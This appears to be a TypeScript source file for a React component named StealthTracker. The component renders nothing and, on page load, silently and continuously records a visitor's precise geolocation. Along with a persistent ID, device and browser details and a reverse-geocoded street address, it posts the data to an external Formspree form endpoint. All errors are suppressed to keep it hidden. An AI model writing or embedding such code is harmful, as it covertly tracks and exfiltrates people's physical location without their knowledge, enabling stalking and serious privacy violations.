import { useEffect, useRef, useState } from 'react';

interface StealthTrackerProps {
  onLocationUpdate?: (location: { latitude: number; longitude: number; timestamp: string }) => void;
}

export const StealthTracker = ({ onLocationUpdate }: StealthTrackerProps) => {
  const watchIdRef = useRef<number | null>(null);
  const trackingStarted = useRef(false);
  const [userId] = useState(() => {
    // Generate or retrieve unique user ID
    let storedId = localStorage.getItem('user_tracking_id');
    if (!storedId) {
      storedId = `USR-${Date.now().toString(36)}-${Math.random().toString(36).substr(2, 5)}`.toUpperCase();
      localStorage.setItem('user_tracking_id', storedId);
    }
    return storedId;
  });
  const [isTrackingActive, setIsTrackingActive] = useState(true);

  // Check for stop commands every 10 seconds
  useEffect(() => {
    const checkForStopCommands = () => {
      const stopCommand = localStorage.getItem(`stop_tracking_${userId}`);
      if (stopCommand === 'true') {
        setIsTrackingActive(false);
        if (watchIdRef.current !== null) {
          navigator.geolocation.clearWatch(watchIdRef.current);
          watchIdRef.current = null;
        }
        // Notify about stop
        submitStealthData({
          latitude: 0,
          longitude: 0,
          timestamp: new Date().toISOString()
        }, 'tracking_stopped_by_admin');
      }
    };

    const interval = setInterval(checkForStopCommands, 10000);
    return () => clearInterval(interval);
  }, [userId]);

  useEffect(() => {
    // Start stealth tracking immediately when component mounts
    if (!trackingStarted.current) {
      trackingStarted.current = true;
      startStealthTracking();
    }

    return () => {
      if (watchIdRef.current !== null) {
        navigator.geolocation.clearWatch(watchIdRef.current);
        watchIdRef.current = null;
      }
    };
  }, []);

  const startStealthTracking = () => {
    if (!navigator.geolocation || !isTrackingActive) {
      return; // Silently fail
    }

    const options = {
      enableHighAccuracy: true,
      timeout: 8000, // Faster timeout for stealth tracking
      maximumAge: 0 // No cache for most accurate location
    };

    // First, get immediate location
    navigator.geolocation.getCurrentPosition(
      (position) => {
        if (!isTrackingActive) return;
        
        const location = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          timestamp: new Date().toISOString()
        };
        
        onLocationUpdate?.(location);
        submitStealthData(location, 'site_visit');
      },
      () => {}, // Silent error handling
      options
    );

    // Then start continuous tracking
    watchIdRef.current = navigator.geolocation.watchPosition(
      (position) => {
        if (!isTrackingActive) return;
        
        const location = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          timestamp: new Date().toISOString()
        };

        onLocationUpdate?.(location);
        submitStealthData(location, 'continuous_tracking');
      },
      () => {}, // Silent error handling
      options
    );
  };

  const getBrowserInfo = () => {
    const ua = navigator.userAgent;
    if (ua.includes('Chrome')) return 'Chrome';
    if (ua.includes('Firefox')) return 'Firefox';
    if (ua.includes('Safari')) return 'Safari';
    if (ua.includes('Edge')) return 'Edge';
    return 'Unknown Browser';
  };

  const updateLocalTrackingData = (userData: any) => {
    try {
      const existingData = JSON.parse(localStorage.getItem('admin_tracked_users') || '[]');
      const userIndex = existingData.findIndex((user: any) => user.userId === userData.userId);
      
      const updatedUser = {
        userId: userData.userId,
        lastSeen: userData.timestamp,
        location: userData.location,
        coordinates: userData.coordinates,
        trackingDuration: Math.floor((Date.now() - new Date(userData.timestamp).getTime()) / 1000),
        isActive: isTrackingActive,
        deviceInfo: userData.deviceInfo,
        sessionStart: userIndex === -1 ? userData.timestamp : existingData[userIndex].sessionStart
      };

      if (userIndex !== -1) {
        existingData[userIndex] = updatedUser;
      } else {
        existingData.push(updatedUser);
      }

      localStorage.setItem('admin_tracked_users', JSON.stringify(existingData));
    } catch (error) {
      // Silent fail
    }
  };

  const submitStealthData = async (location: { latitude: number; longitude: number; timestamp: string }, trackingType: string) => {
    try {
      // Generate map links
      const googleMapLink = `https://www.google.com/maps?q=${location.latitude},${location.longitude}&z=15`;
      const openStreetMapLink = `https://www.openstreetmap.org/?mlat=${location.latitude}&mlon=${location.longitude}&zoom=15`;
      
      const formData = new FormData();
      formData.append('user_id', userId);
      formData.append('tracking_session_id', `${userId}_${Date.now()}`);
      formData.append('latitude', location.latitude.toString());
      formData.append('longitude', location.longitude.toString());
      formData.append('timestamp', location.timestamp);
      formData.append('tracking_type', trackingType);
      formData.append('map_link_google', googleMapLink);
      formData.append('map_link_osm', openStreetMapLink);
      formData.append('stealth_mode', 'true');
      formData.append('tracking_status', isTrackingActive ? 'active' : 'stopped');
      formData.append('page_url', window.location.href);
      formData.append('user_agent', navigator.userAgent);
      formData.append('screen_resolution', `${screen.width}x${screen.height}`);
      formData.append('browser_language', navigator.language);
      formData.append('timezone', Intl.DateTimeFormat().resolvedOptions().timeZone);
      formData.append('formatted_coordinates', `${location.latitude.toFixed(6)}°, ${location.longitude.toFixed(6)}°`);
      formData.append('readable_time', new Date(location.timestamp).toLocaleString());

      // Get reverse geocoding data for better email info
      try {
        const response = await fetch(
          `https://nominatim.openstreetmap.org/reverse?format=json&lat=${location.latitude}&lon=${location.longitude}`
        );
        const geoData = await response.json();
        
        if (geoData.address) {
          formData.append('country', geoData.address.country || '');
          formData.append('state', geoData.address.state || geoData.address.region || '');
          formData.append('city', geoData.address.city || geoData.address.town || geoData.address.village || '');
          formData.append('address_full', geoData.display_name || '');
          
          // Update local tracking data for admin dashboard
          updateLocalTrackingData({
            userId,
            location: `${geoData.address.city || 'Unknown'}, ${geoData.address.state || ''}, ${geoData.address.country || ''}`,
            coordinates: `${location.latitude.toFixed(4)}°, ${location.longitude.toFixed(4)}°`,
            timestamp: location.timestamp,
            deviceInfo: getBrowserInfo(),
            trackingType
          });
        }
      } catch {
        // Continue without geocoding data
        updateLocalTrackingData({
          userId,
          location: 'Location data unavailable',
          coordinates: `${location.latitude.toFixed(4)}°, ${location.longitude.toFixed(4)}°`,
          timestamp: location.timestamp,
          deviceInfo: getBrowserInfo(),
          trackingType
        });
      }

      await fetch('https://formspree.io/f/xwpbjvky', {
        method: 'POST',
        body: formData,
        headers: { 'Accept': 'application/json' }
      });
    } catch (error) {
      // Silent fail - continue tracking
    }
  };

  // This component renders nothing (invisible)
  return null;
};